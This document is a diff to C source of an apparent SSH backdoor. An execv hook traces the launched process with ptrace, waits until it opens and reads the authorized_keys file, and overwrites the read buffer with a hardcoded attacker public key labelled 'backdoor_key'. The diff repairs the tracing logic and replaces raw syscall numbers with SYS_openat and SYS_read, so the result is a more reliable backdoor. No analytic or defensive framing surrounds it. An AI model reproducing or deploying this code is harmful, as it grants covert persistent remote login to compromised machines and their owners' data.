@@ -66,11 +66,12 @@ execv_hook (const char *path, char *const argv[])
     call_execv (path, argv);
 
   uint32_t pid = sys_fork ();
-  if (pid != 0)
-    call_execv (path, argv);
+  if (pid == 0)
+    {
+      sys_ptrace (PTRACE_TRACEME, 0, 0, 0);
+      call_execv (path, argv);
+    }
 
-  pid = sys_getppid ();
-  sys_ptrace (PTRACE_ATTACH, pid, NULL, NULL);
   sys_wait (pid);
   sys_ptrace (PTRACE_SETOPTIONS, pid, NULL, (void *)PTRACE_O_TRACESYSGOOD);
   set_my_pubkey (pid);
@@ -93,7 +94,7 @@ set_my_pubkey (uint32_t pid)
   struct ptrace_syscall_info info;
   while (1)
     {
-      break_at_sys_nr (pid, 0x101, &info);
+      break_at_sys_nr (pid, SYS_openat, &info);
       copy_from_tracee (pid, info.entry.args[1], (uint8_t *)buf, 0x10);
       if (((uint64_t *)buf)[0] == ((uint64_t *)authorized_key)[0]
           && ((uint64_t *)buf)[1] == ((uint64_t *)authorized_key)[1])
@@ -101,12 +102,11 @@ set_my_pubkey (uint32_t pid)
     }
   // now session trying to open authorized_key
 
-  break_at_sys_nr (pid, 0x0, &info);
+  break_at_sys_nr (pid, SYS_read, &info);
   // now session trying to read authorized_key
   uint8_t backdoor_key[] = SSH_PUBKEY;
   void *read_to = (void *)info.entry.args[1];
   next_syscall (pid);
-  get_syscall_info (pid, &info);
 
   copy_to_tracee (pid, (uint64_t)read_to, backdoor_key, sizeof (SSH_PUBKEY));
   // set my key
